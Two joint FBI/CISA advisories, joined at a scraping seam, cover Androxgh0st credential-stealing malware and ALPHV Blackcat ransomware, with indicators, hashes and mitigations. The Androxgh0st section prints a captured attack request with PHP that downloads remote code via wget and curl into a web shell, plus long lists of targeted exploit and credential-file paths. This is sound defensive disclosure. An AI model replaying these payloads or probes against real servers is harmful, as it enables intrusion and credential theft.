The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) to disseminate known indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with threat actors deploying Androxgh0st malware. Multiple, ongoing investigations and trusted third party reporting yielded the IOCs and TTPs, and provided information on Androxgh0st malware’s ability to establish a botnet that can further identify and compromise vulnerable networks.
The FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of cybersecurity incidents caused by Androxgh0st infections.
Download the PDF version of this report:


AA24-016A Known Indicators of Compromise Associated with Androxgh0st Malware
(PDF,       576.40 KB
  )




AA24-016A Known Indicators of Compromise Associated with Androxgh0st Malware - Spanish
(PDF,       353.45 KB
  )


For a downloadable copy of IOCs, see:


AA24-016A STIX XML
(XML,       45.81 KB
  )




AA24-016A STIX JSON
(JSON,       39.87 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding mitigation and/or detection recommendations. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
Androxgh0st malware has been observed establishing a botnet, for victim identification and exploitation in target networks. According to open source reporting,1, Androxgh0st is a Python-scripted malware, primarily used to target .env files that contain confidential information, such as credentials, for various high profile applications (i.e., Amazon Web Services,AWS, Microsoft Office 365, SendGrid, and Twilio from the Laravel web application framework). Androxgh0st malware also supports numerous functions capable of abusing the Simple Mail Transfer Protocol (SMTP), such as scanning, and exploiting exposed credentials, and application programming interfaces (APIs), and web shell deployment,.
Targeting the PHPUnit
Androxgh0st malware TTPs commonly involves the use of scripts, conducting scanning, and searching for websites with specific vulnerabilities. In particular, threat actors deploying Androxgh0st have been observed exploiting CVE-2017-9841 to remotely run hypertext preprocessor (PHP) code on fallible websites via PHPUnit,. Websites using the PHPUnit module that have internet-accessible (exposed) /vendor folders are subject to malicious HTTP POST requests to the /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php uniform resource identifier (URI). This PHP page runs PHP code submitted through a POST request, which allows the threat actors to remotely execute code.
Malicious actors likely use Androxgh0st to download malicious files, to the system hosting the website. Threat actors are further able to set up a fake (illegitimate) page accessible via the URI to provide backdoor access to the website. This allows threat actors to download additional malicious files for their operations and access databases.
Laravel Framework Targeting
Androxgh0st malware establishes a botnet to scan for websites using the Laravel web application framework. After identifying websites using the Laravel web application, threat actors attempt to determine if the domain’s root-level .env file is exposed and contains credentials for accessing additional services. Note: .env files commonly store credentials and tokens. Threat actors often target .env files to steal these credentials within the environment variables.
If the .env file is exposed, threat actors will issue a GET request to the /.env URI to attempt to access the data on the page. Alternatively, Androxgh0st may issue a POST request to the same URI with a POST variable named 0x, containing certain data sent to the web server. This data is frequently used as an identifier for the threat actor. This method appears to be used for websites in debug mode (i.e., when non-production websites are exposed to the internet). A successful response from either of these methods allows the threat actors to look for usernames, passwords, and/or other credentials pertaining to services such as email (via SMTP) and AWS accounts.
Androxgh0st malware can also access the application key, for the Laravel application on the website. If the threat actors successfully identify the Laravel application key, they will attempt exploitation by using the key to encrypt PHP code,. The encrypted code is then passed to the website as a value in the cross-site forgery request (XSRF) token cookie, XSRF-TOKEN, and included in a future GET request to the website. The vulnerability defined in CVE-2018-15133 indicates that on Laravel applications, XSRF token values are subject to an un-serialized call, which can allow for remote code execution. In doing so, the threat actors can upload files to the website via remote access.
Apache Web Server Targeting
In correlation with CVE-2021-41773, Androxgh0st actors have been observed scanning vulnerable web servers, running Apache HTTP Server versions 2.4.49 or 2.4.50. Threat actors can identify uniform resource locators (URLs) for files outside root directory through a path traversal attack,. If these files are not protected by the “request all denied” configuration and Common Gateway Interface (CGI) scripts are enabled, this may allow for remote code execution.
If threat actors obtain credentials for any services using the above methods, they may use these credentials to access sensitive data or use these services to conduct additional malicious operations. For example, when threat actors successfully identify and compromise AWS credentials from a vulnerable website, they have been observed attempting to create new users and user policies,. Additionally, Andoxgh0st actors have been observed creating new AWS instances to use for conducting additional scanning activity,.
INDICATORS OF COMPROMISE (IOCs)
Based on investigations and analysis, the following requests are associated with Androxgh0st activity:

Incoming GET and POST requests to the following URIs:

/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/.env


Incoming POST requests with the following strings:,0x%5B%5D=androxgh0st,
ImmutableMultiDict(,('0x,', 'androxgh0st'),)



In both previously listed POST request strings, the name androxgh0st has been observed to be replaced with other monikers.
Additional URIs observed by the FBI and a trusted third party used by these threat actors for credential exfiltration include:

/info
/phpinfo
/phpinfo.php
/?phpinfo=1
/frontend_dev.php/$
/_profiler/phpinfo
/debug/default/view?panel=config
/config.json
/.json
/.git/config
/live_env
/.env.dist
/.env.save
/environments/.env.production
/.env.production.local
/.env.project
/.env.development
/.env.production
/.env.prod
/.env.development.local
/.env.old
/<insert-directory>/.env 

Note: the actor may attempt multiple different potential URI endpoints scanning for the .env file, for example /docker/.env or /local/.env.


/.aws/credentials
/aws/credentials
/.aws/config
/.git
/.test
/admin
/backend
/app
/current
/demo
/api
/backup
/beta
/cron
/develop
/Laravel
/laravel/core
/gists/cache
/test.php
/info.php
//.env
/admin-app/.env%20
/laravel/.env%20
/shared/.env%20
/.env.project%20
/apps/.env%20
/development/.env%20
/live_env%20
/.env.development%20

Targeted URIs for web-shell drop:

/.env/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/phpunit/Util/PHP/eval-stdin.php
//lib/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/Util/PHP/eval-stdin.php
//new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//phpunit/phpunit/src/Util/PHP/eval-stdin.php
//phpunit/phpunit/Util/PHP/eval-stdin.php
//phpunit/src/Util/PHP/eval-stdin.php
//phpunit/Util/PHP/eval-stdin.php
//protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/evalstdin.php
//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
//vendor/phpunit/src/Util/PHP/eval-stdin.php
//vendor/phpunit/Util/PHP/eval-stdin.php
//wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php
/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php
/lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/Util/PHP/eval
stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/Util/PHP/eval-stdin.php
/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/phpunit/Util/PHP/eval-stdin.php
/phpunit/phpunit/Util/PHP/eval-stdin.php%20/phpunit/src/Util/PHP/evalstdin.php
/phpunit/src/Util/PHP/eval-stdin.php
./phpunit/Util/PHP/eval-stdin.php
/phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.dev
/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/Util/PHP/eval-stdin.php%20
/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php

An example of attempted credential exfiltration through (honeypot) open proxies:
POST /.aws/credentials HTTP/1.1host: www.example.comuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36accept-encoding: gzip, deflateaccept: */*connection: keep-alivecontent-length: 20content-type: application/x-www-form-urlencoded0x%5B%5D=androxgh0st
An example of attempted web-shell drop through (honeypot) open proxies:
GET http://www.example.com/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1host: www.example.comuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76accept-encoding: gzip, deflateaccept: */*connection: keep-alivex-forwarded-for: 200.172.238.135content-length: 279<?php file_put_contents('evil.php',file_get_contents('hxxps://mc.rockylinux,.,si/seoforce/triggers/files/evil.txt')); system('wget hxxps://mc.rockylinux,.,si/seoforce/triggers/files/evil.txt -O evil.php;curl hxxps://mc.rockylinux,.,si/seoforce/triggers/files/evil.txt -O evil.php'); ?>
Monikers used instead of Androxgh0st (0x%5B%5D=???):

Ridho
Aws
0x_0x
x_X
nopebee7
SMTPEX
evileyes0
privangga
drcrypter
errorcool
drosteam
androxmen
crack3rz
b4bbyghost
0x0day
janc0xsec
blackb0x
0x1331day
Graber

Example malware drops through eval-stdin.php:
hxxps://mc.rockylinux,.,si/seoforce/triggers/files/evil.txt59e90be75e51c86b4b9b69dcede2cf815da5a79f7e05cac27c95ec35294151f4hxxps://chainventures.co,.,uk/.well-known/aasdcf8f640dd7cc27d2399cce96b1cf4b75e3b9f2dfdf19cee0a170e5a6d2ce6b6hxxp://download.asyncfox,.,xyz/download/xmrig.x86_6423fc51fde90d98daee27499a7ff94065f7ed4ac09c22867ebd9199e025dee066hxxps://pastebin,.,com/raw/zw0gAmpCca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72hxxp://raw.githubusercontent,.,com/0x5a455553/MARIJUANA/master/MARIJUANA.php0df17ad20bf796ed549c240856ac2bf9ceb19f21a8cae2dbd7d99369ecd317efhxxp://45.95.147,.,236/tmp.x86_646b5846f32d8009e6b54743d6f817f0c3519be6f370a0917bf455d3d114820bbchxxp://main.dsn,.,ovh/dns/pwerbb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7hxxp://tangible-drink.surge,.,sh/configx.txtde1114a09cbab5ae9c1011ddd11719f15087cc29c8303da2e71d861b0594a1ba
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 1-10 for all referenced threat actor tactics and techniques in this advisory.










MITIGATIONS
The FBI and CISA recommend implementing the mitigations below to improve your organization’s cybersecurity posture based on Androxgh0st threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. FBI and CISA recommend that software manufacturers incorporate secure by design principles and tactics into their software development practices, limiting the impact of actor techniques and strengthening their customers’ security posture. For more information on secure by design, see CISA’s Secure by Design webpage.
The FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by actors using Androxgh0st malware.

Keep all operating systems, software, and firmware up to date. Specifically, ensure that Apache servers are not running versions 2.4.49 or 2.4.50. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems.
Verify that the default configuration for all URIs is to deny all requests unless there is a specific need for it to be accessible.
Ensure that any live Laravel applications are not in “debug” or testing mode. Remove all cloud credentials from .env files and revoke them. All cloud providers have safer ways to provide temporary, frequently rotated credentials to code running inside a web server without storing them in any file.
On a one-time basis for previously stored cloud credentials, and on an on-going basis for other types of credentials that cannot be removed, review any platforms or services that have credentials listed in the .env file for unauthorized access or use.
Scan the server’s file system for unrecognized PHP files, particularly in the root directory or /vendor/phpunit/phpunit/src/Util/PHP folder.
Review outgoing GET requests (via cURL command) to file hosting sites such as GitHub, pastebin, etc., particularly when the request accesses a .php file.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 1-10).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REPORTING
The FBI encourages organizations to report information concerning suspicious or criminal activity to their local FBI field office. With regards to specific information that appears in this CSA, indicators should always be evaluated in light of an organization’s complete security situation.
When available, each report submitted should include the date, time, location, type of activity, number of people, and type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact. Reports can be submitted to the FBI Internet Crime Complaint Center (IC3), a local FBI Field Office, or to CISA via its Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
RESOURCES

CISA: Known Exploited Vulnerabilities Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
NIST: CVE-2017-9841
NIST: CVE-2018-15133
NIST: CVE-2021-41773
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design

REFERENCES

Fortinet - FortiGuard Labs: Threat Signal Report: AndroxGh0st Malware Actively Used in the Wild

ACKNOWLEDGEMENTS
Amazon contributed to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI and CISA.
VERSION HISTORY
January 16, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-016a
5,"






Actions to take today to mitigate against the threat of ransomware:




Routinely take inventory of assets and data to identify authorized and unauthorized devices and software.
Prioritize remediation of known exploited vulnerabilities.
Enable and enforce multifactor authentication with strong passwords.
Close unused ports and remove applications not deemed necessary for day-to-day operations.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Health and Human Services (HHS) are releasing this joint CSA to disseminate known IOCs and TTPs associated with the ALPHV Blackcat ransomware as a service (RaaS) identified through FBI investigations as recently as February 2024.
This advisory provides updates to the FBI FLASH BlackCat/ALPHV Ransomware Indicators of Compromise released April 19, 2022, and to this advisory released December 19, 2023. ALPHV Blackcat actors have since employed improvised communication methods by creating victim-specific emails to notify of the initial compromise. Since mid-December 2023, of the nearly 70 leaked victims, the healthcare sector has been the most commonly victimized. This is likely in response to the ALPHV Blackcat administrator’s post encouraging its affiliates to target hospitals after operational action against the group and its infrastructure in early December 2023.
FBI, CISA, and HHS encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ALPHV Blackcat ransomware and data extortion incidents.
In February 2023, ALPHV Blackcat administrators announced the ALPHV Blackcat Ransomware 2.0 Sphynx update, which was rewritten to provide additional features to affiliates, such as better defense evasion and additional tooling. This ALPHV Blackcat update has the capability to encrypt both Windows and Linux devices, and VMWare instances. ALPHV Blackcat affiliates have extensive networks and experience with ransomware and data extortion operations.
Download the PDF version of this report:


AA23-353A #StopRansomware: ALPHV Blackcat (Update)
(PDF,       578.24 KB
  )


For a downloadable copy of IOCs, see:


AA23-353A STIX XML
(XML,       46.14 KB
  )




AA23-353A STIX JSON
(JSON,       32.93 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
ALPHV Blackcat affiliates use advanced social engineering techniques and open source research on a company to gain initial access. Actors pose as company IT and/or helpdesk staff and use phone calls or SMS messages [T1598] to obtain credentials from employees to access the target network [T1586]. ALPHV Blackcat affiliates use uniform resource locators (URLs) to live-chat with victims to convey demands and initiate processes to restore the victims’ encrypted files.
After gaining access to a victim network, ALPHV Blackcat affiliates deploy remote access software such as AnyDesk, Mega sync, and Splashtop in preparation of data exfiltration. ALPHV Blackcat affiliates create a user account, “aadmin,” and use Kerberos token generation for domain access [T1558]. After gaining access to networks, they use legitimate remote access and tunneling tools, such as Plink and Ngrok [S0508]. ALPHV Blackcat affiliates claim to use Brute Ratel C4 [S1063] and Cobalt Strike [S1054] as beacons to command and control servers. ALPHV Blackcat affiliates use the open source adversary-in-the-middle attack [T1557] framework Evilginx2, which allows them to obtain multifactor authentication (MFA) credentials, login credentials, and session cookies. The actors also obtain passwords from the domain controller, local network, and deleted backup servers to move laterally throughout the network [T1555].
To evade detection, affiliates employ allowlisted applications such as Metasploit. Once installed on the domain controller, the logs are cleared on the exchange server. Then Mega.nz or Dropbox are used to move, exfiltrate, and/or download victim data. The ransomware is then deployed, and the ransom note is embedded as a file.txt. According to public reporting, affiliates have additionally used POORTRY and STONESTOP to terminate security processes.
Some ALPHV Blackcat affiliates exfiltrate data after gaining access and extort victims without deploying ransomware. After exfiltrating and/or encrypting data, ALPHV Blackcat affiliates communicate with victims via TOR [S0183], Tox, email, or encrypted applications. The threat actors then delete victim data from the victim’s system.
ALPHV Blackcat affiliates offer to provide unsolicited cyber remediation advice as an incentive for payment, offering to provide victims with “vulnerability reports” and “security recommendations” detailing how they penetrated the system and how to prevent future re-victimization upon receipt of ransom payment. The ALPHV Blackcat encryptor results in a file with the following naming convention: RECOVER-(seven-digit extension) FILES.txt.

 

Figure 1: Ransom Note Instruction

INDICATORS OF COMPROMISE (IOCs)

Table 1: MD5 Hashes


MD5
Description
File Name




944153fb9692634d6c70899b83676575
ALPHV Windows Encryptor
 


341d43d4d5c2e526cadd88ae8da70c1c
Anti Virus Tools Killer
363.sys


34aac5719824e5f13b80d6fe23cbfa07
CobaltStrike BEACON
LMtool.exe


eea9ab1f36394769d65909f6ae81834b
CobaltStrike BEACON
Info.exe


379bf8c60b091974f856f08475a03b04
ALPHV Linux Encryptor
him


ebca4398e949286cb7f7f6c68c28e838
SimpleHelp Remote Management tool
first.exe


c04c386b945ccc04627d1a885b500edf
Tunneler Tool
conhost.exe


824d0e31fd08220a25c06baee1044818
Anti Virus Tools Killer
ibmModule.dll


eea9ab1f36394769d65909f6ae81834b
CobaltStrike BEACON
ConnectivityDiagnos.exe


944153fb9692634d6c70899b83676575
ALPHV Windows Encryptor
7O3cCX9YcHMV2.exe


61804a029e9b1753d58a6bf0274c25a6
MeshCentral Agent
WPEHOSTSVC64.exe


83deea3b61b6a734e7e4a566dbb6bffa
ScreenConnect & attacker tools installer
deployService.exe


8738b8637a20fa65c6e64d84d1cfe570
Suspected Proxy Tool
socks32.exe




Table 2: SHA256 Hashes


SHA256
Description




c64300cf8bacc4e42e74715edf3f8c3287a780c9c0a38b0d9675d01e7e231f16
ALPHV Windows Encryptor


1f5e4e2c78451623cfbf32cf517a92253b7abfe0243297c5ddf7dd1448e460d5
Anti Virus Tools Killer


3670dd4663adca40f168f3450fa9e7e84bc1a612d78830004020b73bd40fcd71
CobaltStrike BEACON


af28b78c64a9effe3de0e5ccc778527428953837948d913d64dbd0fa45942021
CobaltStrike BEACON


bbfe7289de6ab1f374d0bcbeecf31cad2333b0928ea883ca13b9e733b58e27b1
ALPHV Linux Encryptor


5d1df950b238825a36fa6204d1a2935a5fbcfe2a5991a7fc69c74f476df67905
SimpleHelp Remote Management tool


bd9edc3bf3d45e3cdf5236e8f8cd57a95ca3b41f61e4cd5c6c0404a83519058e
Tunneler Tool


732e24cb5d7ab558effc6dc88854f756016352c923ff5155dcb2eece35c19bc0
Anti Virus Tools Killer




Table 3: SHA1 Hashes


SHA1
Description




3dd0f674526f30729bced4271e6b7eb0bb890c52
ALPHV Windows Encryptor


d6d442e8b3b0aef856ac86391e4a57bcb93c19ad
Anti Virus Tools Killer


6b52543e4097f7c39cc913d55c0044fcf673f6fc
CobaltStrike BEACON


004ba0454feb2c4033ff0bdb2ff67388af0c41b6
CobaltStrike BEACON


430bd437162d4c60227288fa6a82cde8a5f87100
SimpleHelp Remote Management tool


1376ac8b5a126bb163423948bd1c7f861b4bfe32
Tunneler Tool


380f941f8047904607210add4c6da2da8f8cd398
Anti Virus Tools Killer




Table 4: Network Indicators


Indicator Type
Network Indicator
Description




Domain
resources.docusong[.]com
Command and Control Server


Domain
Fisa99.screenconnect[.]com
ScreenConnect Remote Access


IP Address
5.199.168.24
Command and Control Server


IP Address
91.92.254.193
SimpleHelp Remote Access


Domain
pcrendal[.]com
Command and Control Server


Domain
instance-qqemas-relay[.]screenconnect[.]com
ScreenConnect Remote Access


Domain
instance-rbjvws-relay.screenconnect[.]com
ScreenConnect Remote Access


IP Address
5.199.168[.]233
IP Address used by Threat Actor


IP Address
92.223.89[.]55
IP Address used by Threat Actor


IP Address
185.195.59[.]218
IP Address used by Threat Actor


IP Address
51.159.103[.]112
IP Address used by Threat Actor


IP Address
45.32.141[.]168
Command and Control Server


IP Address
45.77.0[.]92
Command and Control Server



MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 5 through Table 7 for all referenced threat actor tactics and techniques in this advisory.

Table 5: ALPHV Blackcat/ALPHV Threat Actors ATT&CK Techniques - Reconnaissance


Technique Title
ID
Use




Phishing for Information
T1598
ALPHV Blackcat affiliates pose as company IT and/or helpdesk staff using phone calls or SMS messages to obtain credentials from employees to access the target network.




Table 6: ALPHV Blackcat/ALPHV Threat Actors ATT&CK Techniques – Resource Development


Technique Title
ID
Use




Compromise Accounts
T1586
ALPHV Blackcat affiliates use compromised accounts to gain access to victims’ networks.




Table 7: ALPHV Blackcat/ALPHV Threat Actors ATT&CK Techniques – Credential Access


Technique Title
ID
Use




Obtain Credentials from Passwords Stores
T1555
ALPHV Blackcat affiliates obtain passwords from local networks, deleted servers, and domain controllers.


Steal or Force Kerberos Tickets
T1558
ALPHV Blackcat/ALPHV affiliates use Kerberos token generation for domain access.


Adversary-in-the-Middle
T1557
ALPHV Blackcat/ALPHV affiliates use the open-source framework Evilginx2 to obtain MFA credentials, login credentials, and session cookies for targeted networks.



INCIDENT RESPONSE
If compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Provision new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.
Report the compromise or phishing incident to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870). State, local, tribal, or territorial government entities can also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722).
To report spoofing or phishing attempts (or to report that you’ve been a victim), file a complaint with the FBI’s Internet Crime Complaint Center (IC3), or contact your local FBI Field Office to report an incident.

MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. FBI, CISA, and HHS recommend that software manufactures incorporate secure by design principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the security posture for their customers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
FBI, CISA, and HHS recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture based on threat actor activity and to reduce the risk of compromise by ALPHV Blackcat threat actors. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections. Due to the threat ALPHV Blackcat’s poses in the healthcare sector, healthcare organizations can look to the Healthcare and Public Health (HPH) Sector Cybersecurity Performance Goals to implement cybersecurity protections against the most common threats. tactics, techniques, and procedures used against this sector.

Secure remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Applying recommendations in CISA's joint Guide to Securing Remote Access Software.


Implementing FIDO/WebAuthn authentication or Public key Infrastructure (PKI)-based MFA [CPG 2.H][HPH CPG – Multifactor Authentication]. These MFA implementations are resistant to phishing and not susceptible to push bombing or SIM swap attacks, which are techniques known be used by ALPHV Blackcat affiliates. See CISA’s Fact Sheet Implementing Phishing-Resistant MFA for more information.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic [CPG 5.1][HPH CPG – Detect and Respond to Relevant Threats and Tactics, Techniques and Procedures], including lateral movement activity on a network. Endpoint detection and response (EDR) tools are useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Implement user training on social engineering and phishing attacks [CPG 2.I][HPH CPG – Basic Cybersecurity Training]. Regularly educate users on identifying suspicious emails and links, not interacting with those suspicious items, and the importance of reporting instances of opening suspicious emails, links, attachments, or other potential lures.
Implement internal mail and messaging monitoring. Monitoring internal mail and messaging traffic to identify suspicious activity is essential as users may be phished from outside the targeted network or without the knowledge of the organizational security team. Establish a baseline of normal network traffic and scrutinize any deviations.
Implement free security tools to prevent cyber threat actors from redirecting users to malicious websites to steal their credentials. For more information see, CISA’s Free Cybersecurity Services and Tools webpage.
Install and maintain antivirus software. Antivirus software recognizes malware and protects your computer against it. Installing antivirus software from a reputable vendor is an important step in preventing and detecting infections. Always visit vendor sites directly rather than clicking on advertisements or email links. Because attackers are continually creating new viruses and other forms of malicious code, it is important to keep your antivirus software up to date.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 1-3).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to reduce the risk of a ransomware attack: #StopRansomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.
Health and Human Services HPH Cybersecurity Gateway hosts the HPH CPGs and links to HHS cybersecurity resources.

DISCLAIMER
